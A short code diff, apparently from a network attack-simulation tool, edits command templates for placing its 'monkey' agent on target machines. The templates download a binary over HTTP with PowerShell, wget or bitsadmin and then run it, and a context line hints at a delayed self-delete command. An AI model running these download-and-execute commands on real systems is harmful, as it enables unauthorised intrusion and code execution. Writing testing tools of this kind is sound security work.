@@ -19,7 +19,7 @@ DELAY_DELETE_CMD = 'cmd /c (for /l %%i in (1,0,2) do (ping -n 60 127.0.0.1 & del
 # Commands used for downloading monkeys
 POWERSHELL_HTTP = "powershell -NoLogo -Command \"Invoke-WebRequest -Uri \\\'%%(http_path)s\\\' -OutFile \\\'%%(monkey_path)s\\\' -UseBasicParsing; %%(monkey_path)s %s %%(parameters)s\"" % (DROPPER_ARG, )
 WGET_HTTP = "wget -O %%(monkey_path)s %%(http_path)s && chmod +x %%(monkey_path)s && %%(monkey_path)s %s %%(parameters)s" % (DROPPER_ARG, )
-RDP_CMDLINE_HTTP_BITS_DROPPER = 'bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s&&start /b %%(monkey_path)s %s %%(parameters)s'  % (DROPPER_ARG, )
+RDP_CMDLINE_HTTP = 'bitsadmin /transfer Update /download /priority high %%(http_path)s %%(monkey_path)s&&start /b %%(monkey_path)s %%(type)s %%(parameters)s'
 
 # Commands used to check for architecture and if machine is exploitable
 CHECK_WINDOWS = "echo %s && wmic os get osarchitecture" % ID_STRING
